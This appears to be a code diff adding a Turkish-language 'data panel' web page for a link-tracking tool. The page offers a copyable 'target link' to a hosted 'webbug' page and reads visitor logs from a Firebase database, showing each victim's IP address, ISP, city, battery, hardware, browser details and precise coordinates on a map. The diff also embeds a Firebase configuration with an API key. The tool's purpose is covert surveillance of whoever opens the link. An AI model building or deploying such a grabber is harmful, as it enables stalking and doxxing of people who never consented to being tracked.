@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Siber Analitik | Harita Destekli Panel</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <style>
+        :root {
+            --mor: #8b5cf6;
+            --neon-mor: #a78bfa;
+            --koyu: #05030a;
+            --neon-yesil: #10b981;
+            --neon-mavi: #3b82f6;
+            --neon-turuncu: #f97316;
+            --cam: rgba(15, 11, 26, 0.8);
+            --sinir: rgba(139, 92, 246, 0.25);
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            background: var(--koyu);
+            color: #cbd5e1;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .admin-container {
+            width: 100%;
+            max-width: 520px;
+            background: var(--cam);
+            backdrop-filter: blur(30px);
+            -webkit-backdrop-filter: blur(30px);
+            border: 1px solid var(--sinir);
+            border-radius: 24px;
+            padding: 25px;
+            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6);
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        h2 {
+            color: #fff;
+            font-size: 18px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            text-align: center;
+            text-shadow: 0 0 15px rgba(139, 92, 246, 0.5);
+        }
+
+        .link-generator-card {
+            background: rgba(5, 3, 10, 0.6);
+            border: 1px solid rgba(139, 92, 246, 0.2);
+            border-radius: 16px;
+            padding: 15px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .card-label {
+            font-size: 11px;
+            color: var(--neon-mor);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: bold;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            background: rgba(5, 3, 10, 0.9);
+            border: 1px solid var(--sinir);
+            padding: 12px 15px;
+            border-radius: 50px;
+            color: #fff;
+            font-size: 13px;
+            outline: none;
+            text-align: center;
+        }
+
+        .button-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            width: 100%;
+        }
+
+        button {
+            width: 100%;
+            background: linear-gradient(135deg, var(--mor), #5b21b6);
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 50px;
+            font-weight: bold;
+            font-size: 12px;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+        }
+
+        button:hover { box-shadow: 0 0 15px var(--mor); }
+
+        .btn-copy {
+            background: rgba(255, 255, 255, 0.06);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .btn-copy:hover { background: rgba(255, 255, 255, 0.12); box-shadow: none; }
+
+        .log-container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            max-height: 600px;
+            overflow-y: auto;
+            padding-right: 5px;
+        }
+
+        .log-card {
+            background: rgba(5, 3, 10, 0.7);
+            border: 1px solid rgba(139, 92, 246, 0.25);
+            border-radius: 16px;
+            padding: 15px;
+            display: flex;
+            flex-direction: column;
+            gap: 7px;
+            font-size: 13px;
+        }
+
+        .log-header {
+            display: flex;
+            justify-content: space-between;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+            padding-bottom: 5px;
+            margin-bottom: 5px;
+            font-size: 11px;
+            color: var(--neon-mavi);
+            font-weight: bold;
+        }
+
+        .log-sub-section {
+            font-size: 10px;
+            color: var(--neon-mor);
+            text-transform: uppercase;
+            margin-top: 5px;
+            letter-spacing: 0.5px;
+            border-bottom: 1px dashed rgba(255, 255, 255, 0.05);
+        }
+
+        .log-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .log-label { color: #94a3b8; font-weight: 500; }
+        .log-value {
+            color: #fff;
+            font-family: monospace;
+            text-align: right;
+            max-width: 65%;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        /* Kart İçi Küçük Harita Alanı */
+        .map-container {
+            width: 100%;
+            height: 160px;
+            border-radius: 12px;
+            margin-top: 8px;
+            border: 1px solid rgba(139, 92, 246, 0.3);
+            z-index: 1;
+        }
+
+        .no-data {
+            text-align: center;
+            color: #64748b;
+            font-style: italic;
+            padding: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="admin-container">
+    <h2>VERİ PANELİ</h2>
+
+    <div class="link-generator-card">
+        <div class="card-label">Hedef Bağlantısı</div>
+        <input type="text" id="targetLinkInput" value="https://kullaniciadi.github.io/webbug/hedef.html">
+        <div class="button-group">
+            <button class="btn-copy" onclick="linkKopyala()">KOPYALA</button>
+        </div>
+    </div>
+
+    <div class="card-label">Veriler</div>
+    
+    <div class="log-container" id="logContainer">
+        <div class="no-data" id="emptyRow">Veritabanı dinleniyor, veri bekleniyor...</div>
+    </div>
+</div>
+
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.15.0/firebase-app.js";
+  import { getDatabase, ref, onChildAdded } from "https://www.gstatic.com/firebasejs/12.15.0/firebase-database.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyDHBtEJGI89L5IRBjsynL0X1CNcd4phcSY",
+    authDomain: "webbug-66fbb.firebaseapp.com",
+    projectId: "webbug-66fbb",
+    storageBucket: "webbug-66fbb.firebasestorage.app",
+    messagingSenderId: "554787868100",
+    appId: "1:554787868100:web:fa13a4a9dade85c6c4a891",
+    measurementId: "G-XJKWQWJYKR"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+  const dbRef = ref(db, "ziyaretci_loglari");
+  
+  const logContainer = document.getElementById("logContainer");
+  const emptyRow = document.getElementById("emptyRow");
+
+  onChildAdded(dbRef, (snapshot) => {
+      const data = snapshot.val();
+      if (emptyRow) emptyRow.remove();
+
+      const time = data.zamanDamgasi ? new Date(data.zamanDamgasi).toLocaleTimeString() : "-";
+      const mapId = "map_" + snapshot.key; // Her karta özel benzersiz harita id'si
+      
+      const card = document.createElement("div");
+      card.className = "log-card";
+      card.innerHTML = `
+          <div class="log-header">
+              <span>Bağlantı Günlüğü</span>
+              <span>${time}</span>
+          </div>
+          
+          <div class="log-sub-section">Ağ ve Konum Bilgileri</div>
+          <div class="log-item"><span class="log-label">IP Adresi:</span><span class="log-value" style="color:var(--neon-yesil); font-weight:bold;">${data.ipAdresi || 'Alınamadı'}</span></div>
+          <div class="log-item"><span class="log-label">Sağlayıcı (ISP):</span><span class="log-value" style="color:var(--neon-turuncu);">${data.internetSaglayici || 'Bilinmiyor'}</span></div>
+          <div class="log-item"><span class="log-label">Konum:</span><span class="log-value">${data.ulkeSehir || 'Bilinmiyor'}</span></div>
+          <div class="log-item"><span class="log-label">Saat Dilimi:</span><span class="log-value">${data.saatDilimi || 'Bilinmiyor'}</span></div>
+
+          <div class="log-sub-section">Donanım, Ekran ve Çevre</div>
+          <div class="log-item"><span class="log-label">Pil Durumu:</span><span class="log-value">${data.pilYuzdesi || 'Bilinmiyor'}</span></div>
+          <div class="log-item"><span class="log-label">İşlemci Mimarisi:</span><span class="log-value">${data.donanimCekirdegi} Çekirdek</span></div>
+          <div class="log-item"><span class="log-label">Cihaz Hafızası:</span><span class="log-value">${data.cihazRam || 'Bilinmiyor'}</span></div>
+
+          <div class="log-sub-section">Yazılım ve Detaylar</div>
+          <div class="log-item"><span class="log-label">Platform / Sistem:</span><span class="log-value">${data.cihazPlatform || 'Bilinmiyor'}</span></div>
+          <div class="log-item"><span class="log-label">Ekran Boyutu:</span><span class="log-value">${data.ekranGenislik}x${data.ekranYukseklik} (${data.renkDerinligi} bit)</span></div>
+          <div class="log-item"><span class="log-label">Tarayıcı Motoru:</span><span class="log-value" title="${data.userAgent}">${data.tarayiciUygulamasi || 'Bilinmiyor'}</span></div>
+          
+          <div class="log-sub-section">Coğrafi Harita Konumu</div>
+          <div id="${mapId}" class="map-container"></div>
+      `;
+      logContainer.insertBefore(card, logContainer.firstChild);
+
+      // Haritayı Çizdirme Mantığı (Eğer enlem ve boylam verisi gelmişse)
+      if (data.enlem && data.boylam) {
+          setTimeout(() => {
+              // Harita alanını başlat (Zoom seviyesi: 12)
+              const map = L.map(mapId).setView([data.enlem, data.boylam], 12);
+              
+              // Koyu siber temaya uygun harita altlığı (CartoDB DarkMatter)
+              L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+                  attribution: '© OpenStreetMap'
+              }).addTo(map);
+
+              // Belirtilen konuma mor bir yuvarlak (çember) işaretçi yerleştirme
+              L.circle([data.enlem, data.boylam], {
+                  color: '#8b5cf6',       // Kenarlık rengi (Mor)
+                  fillColor: '#a78bfa',   // İç dolgu rengi
+                  fillOpacity: 0.5,
+                  radius: 1200            // Metre cinsinden çember yarıçapı
+              }).addTo(map);
+          }, 200);
+      }
+  });
+</script>
+
+<script>
+    function linkOlustur() { alert("Harita modüllü bağlantı entegre edildi."); }
+    function linkKopyala() {
+        const input = document.getElementById("targetLinkInput");
+        input.select();
+        navigator.clipboard.writeText(input.value).then(() => { alert("Bağlantı kopyalandı!"); });
+    }
+</script>
+</body>
+</html>
